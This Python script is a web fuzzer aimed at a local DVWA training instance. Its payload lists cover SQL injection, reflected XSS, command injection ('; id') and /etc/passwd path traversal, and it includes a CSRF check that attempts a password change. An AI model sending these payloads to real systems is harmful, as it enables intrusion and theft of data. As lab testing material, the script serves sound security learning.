#!/usr/bin/env python3
"""
Simple fuzzer for DVWA - tests for SQLi, XSS, command injection, LFI and CSRF.

Before running:
  1. Start DVWA: docker run -d -p 80:80 vulnerables/web-dvwa
  2. Log in (admin/password) and click Create/Reset Database
  3. Open browser devtools, go to Application > Cookies and copy your PHPSESSID
  4. Either paste it below or set it as an env variable:
       export DVWA_SESSION=your_session_id_here
  5. pip3 install requests
  6. python3 fuzzer.py
"""

import os
import re
import time
from datetime import datetime
import requests

TARGET = "http://localhost"

# Paste your PHPSESSID here, or set the DVWA_SESSION environment variable
_session = os.environ.get("DVWA_SESSION", "YOUR_SESSION_ID_HERE")
SESSION_COOKIE = {"PHPSESSID": _session, "security": "low"}

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1-- -",
    "' UNION SELECT null,null-- -",
    "' UNION SELECT null,database()-- -",
    "1 AND SLEEP(3)-- -",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert(1)</script>",
]

CMDI_PAYLOADS = [
    "; id",
    "| id",
    "127.0.0.1; id",
]

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../../../../etc/passwd",
]

SQLI_ERRORS = [
    "You have an error in your SQL syntax",
    "mysql_fetch",
    "Warning: mysql",
]


def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")


def test_sqli(url, param):
    log(f"[SQLi] {url} | param={param}")
    found = []
    for payload in SQLI_PAYLOADS:
        try:
            start = time.time()
            r = requests.get(url, params={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            elapsed = time.time() - start
            for err in SQLI_ERRORS:
                if err.lower() in r.text.lower():
                    log(f"  [VULN] SQLi error-based -- {payload}")
                    found.append(payload)
                    break
            if "SLEEP" in payload.upper() and elapsed > 2.5:
                log(f"  [VULN] SQLi time-based -- took {elapsed:.1f}s")
                found.append(payload)
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}")
    if not found:
        log("  No SQLi found")
    return found


def test_xss(url, param):
    log(f"[XSS] {url} | param={param}")
    found = []
    for payload in XSS_PAYLOADS:
        try:
            r = requests.get(url, params={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            if payload in r.text:
                log(f"  [VULN] Reflected XSS -- {payload}")
                found.append(payload)
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}")
    if not found:
        log("  No XSS found")
    return found


def test_cmdi(url, param):
    log(f"[CMDI] {url} | param={param}")
    found = []
    for payload in CMDI_PAYLOADS:
        try:
            r = requests.post(url, data={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            if "uid=" in r.text or "www-data" in r.text:
                log(f"  [VULN] Command injection -- {payload}")
                found.append(payload)
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}")
    if not found:
        log("  No CMDI found")
    return found


def test_lfi(url, param):
    log(f"[LFI] {url} | param={param}")
    found = []
    for payload in LFI_PAYLOADS:
        try:
            r = requests.get(url, params={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            if "root:x:" in r.text or "daemon:" in r.text:
                log(f"  [VULN] LFI -- {payload}")
                found.append(payload)
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}")
    if not found:
        log("  No LFI found")
    return found


def test_csrf(url, form_fields):
    """Check if a form has a CSRF token. If not, try submitting without one."""
    log(f"[CSRF] {url}")
    try:
        r = requests.get(url, cookies=SESSION_COOKIE, timeout=8)
        # look for common token field names
        has_token = bool(re.search(r'name=["\'\']user_token["\'\']', r.text, re.I))
        if not has_token:
            log("  No CSRF token found -- trying submission without token")
            r2 = requests.get(url, params=form_fields, cookies=SESSION_COOKIE,
                              headers={"Referer": ""}, timeout=8)
            if r2.status_code == 200:
                log("  [VULN] Possible CSRF -- request accepted without token")
                return [url]
        else:
            log("  CSRF token present -- OK")
    except Exception as e:
        log(f"  [ERR] {e}")
    return []


def main():
    if SESSION_COOKIE["PHPSESSID"] == "YOUR_SESSION_ID_HERE":
        print("ERROR: Set your PHPSESSID in the script or via DVWA_SESSION env var")
        return

    log(f"Starting fuzzer against {TARGET}")
    all_findings = []

    all_findings += test_sqli(f"{TARGET}/dvwa/vulnerabilities/sqli/", "id")
    all_findings += test_xss(f"{TARGET}/dvwa/vulnerabilities/xss_r/", "name")
    all_findings += test_cmdi(f"{TARGET}/dvwa/vulnerabilities/exec/", "ip")
    all_findings += test_lfi(f"{TARGET}/dvwa/vulnerabilities/fi/", "page")
    all_findings += test_csrf(
        f"{TARGET}/dvwa/vulnerabilities/csrf/",
        {"password_new": "test123", "password_conf": "test123", "Change": "Change"}
    )

    log(f"\nDone -- {len(all_findings)} finding(s) total")


if __name__ == "__main__":
    main()
